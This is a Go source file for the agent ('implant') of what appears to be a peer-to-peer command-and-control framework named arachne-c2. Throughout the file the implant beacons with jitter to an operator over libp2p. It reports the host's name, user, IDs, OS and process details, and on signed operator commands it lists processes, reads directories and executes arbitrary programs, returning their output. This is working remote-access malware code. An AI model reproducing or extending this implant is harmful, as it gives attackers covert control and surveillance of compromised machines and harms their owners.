package core

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/libp2p/go-libp2p/core/crypto"
	"google.golang.org/protobuf/proto"

	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
	"github.com/anomalyco/arachne-c2/pkg/cryptography"
	"github.com/anomalyco/arachne-c2/pkg/transport"
)

type Agent struct {
	node          *transport.Node
	messenger     *transport.Messenger
	keys          *cryptography.ImplantKey
	operatorPub   crypto.PubKey
	config        AgentConfig
	ctx           context.Context
	cancel        context.CancelFunc
}

type AgentConfig struct {
	OperatorKeyFile  string
	BeaconInterval   time.Duration
	BeaconJitter     time.Duration
	ReconnectBackoff time.Duration
}

func DefaultAgentConfig() AgentConfig {
	return AgentConfig{
		OperatorKeyFile:  "operator.pub",
		BeaconInterval:   30 * time.Second,
		BeaconJitter:     10 * time.Second,
		ReconnectBackoff: 5 * time.Second,
	}
}

func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
	ctx, cancel := context.WithCancel(ctx)

	pubKeyData, err := os.ReadFile(cfg.OperatorKeyFile)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("read operator key %s: %w", cfg.OperatorKeyFile, err)
	}

	operatorPub, err := cryptography.PubKeyFromBytes(pubKeyData)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("parse operator pubkey: %w", err)
	}

	keys, err := cryptography.GenerateImplantKey(operatorPub)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("generate implant key: %w", err)
	}

	nodeCfg := transport.NodeConfig{
		ListenAddr:  "/ip4/0.0.0.0/tcp/0",
		EnableRelay: true,
	}

	node, err := transport.NewNode(ctx, nodeCfg)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("create node: %w", err)
	}

	a := &Agent{
		keys:        keys,
		operatorPub: operatorPub,
		node:        node,
		config:      cfg,
		ctx:         ctx,
		cancel:      cancel,
	}

	a.messenger = transport.NewImplantMessenger(ctx, node, keys, operatorPub)
	a.messenger.SetHandler(a.handleCommand)

	return a, nil
}

func (a *Agent) Start() error {
	log.Printf("[implant] PeerID: %s", a.node.ID().String())
	log.Printf("[implant] Operator PeerID: %s", a.keys.OperatorPubKey)

	if err := a.messenger.ListenCommands(a.ctx); err != nil {
		return fmt.Errorf("listen commands: %w", err)
	}

	go a.beaconLoop()

	return nil
}

func (a *Agent) beaconLoop() {
	for {
		a.sendBeaconRegister()

		jitter := time.Duration(rand.Int63n(int64(a.config.BeaconJitter)))
		sleep := a.config.BeaconInterval + jitter

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(sleep):
		}
	}
}

func (a *Agent) sendBeaconRegister() {
	hostname, _ := os.Hostname()
	reg := &arachnepb.Register{
		Name:     hostname,
		Hostname: hostname,
		Username: os.Getenv("USER"),
		UID:      fmt.Sprintf("%d", os.Getuid()),
		GID:      fmt.Sprintf("%d", os.Getgid()),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      int32(os.Getpid()),
		Filename: os.Args[0],
		Version:  "0.1.0",
		Locale:   os.Getenv("LANG"),
		PeerID:   int64(os.Getpid()),
		ActiveC2: a.node.ID().String(),
	}

	data, err := proto.Marshal(reg)
	if err != nil {
		log.Printf("[implant] marshal register: %v", err)
		return
	}

	env := a.messenger.CreateEnvelope(0, data)
	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send register: %v", err)
		return
	}

	log.Printf("[implant] registered with operator")
}

// handleCommand verifies the operator's signature before processing any command.
func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, senderPub crypto.PubKey) {
	if err := transport.VerifyEnvelope(env, a.operatorPub); err != nil {
		log.Printf("[implant] dropped command — %v", err)
		return
	}

	switch env.Type {
	case 1:
		a.handlePs(env)
	case 2:
		a.handleLs(env)
	case 3:
		a.handleExecute(env)
	default:
		log.Printf("[implant] unknown cmd type=%d", env.Type)
	}
}

func (a *Agent) sendResult(resultType uint32, data []byte) {
	env := a.messenger.CreateEnvelope(resultType, data)
	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send result: %v", err)
	}
}

func (a *Agent) handlePs(env *arachnepb.Envelope) {
	result := &arachnepb.Ps{}
	result.Processes = listProcesses()
	data, _ := proto.Marshal(result)
	a.sendResult(1, data)
}

func (a *Agent) handleLs(env *arachnepb.Envelope) {
	req := &arachnepb.LsReq{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		return
	}

	result := &arachnepb.Ls{Path: req.Path}
	entries, err := os.ReadDir(req.Path)
	if err != nil {
		result.Exists = false
	} else {
		result.Exists = true
		for _, e := range entries {
			info, _ := e.Info()
			fi := &arachnepb.FileInfo{
				Name:  e.Name(),
				IsDir: e.IsDir(),
			}
			if info != nil {
				fi.Size = info.Size()
				fi.ModTime = info.ModTime().Unix()
				fi.Mode = info.Mode().String()
			}
			result.Files = append(result.Files, fi)
		}
	}

	data, _ := proto.Marshal(result)
	a.sendResult(2, data)
}

func (a *Agent) handleExecute(env *arachnepb.Envelope) {
	req := &arachnepb.ExecuteReq{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		return
	}

	result := &arachnepb.Execute{}
	cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
	if req.Output {
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.Status = 1
			result.Stderr = []byte(err.Error())
		}
		result.Stdout = out
	} else {
		if err := cmd.Start(); err != nil {
			result.Status = 1
			result.Stderr = []byte(err.Error())
		} else {
			result.Pid = uint32(cmd.Process.Pid)
			go cmd.Wait()
		}
	}

	data, _ := proto.Marshal(result)
	a.sendResult(3, data)
}

func (a *Agent) Close() error {
	a.cancel()
	return a.node.Close()
}
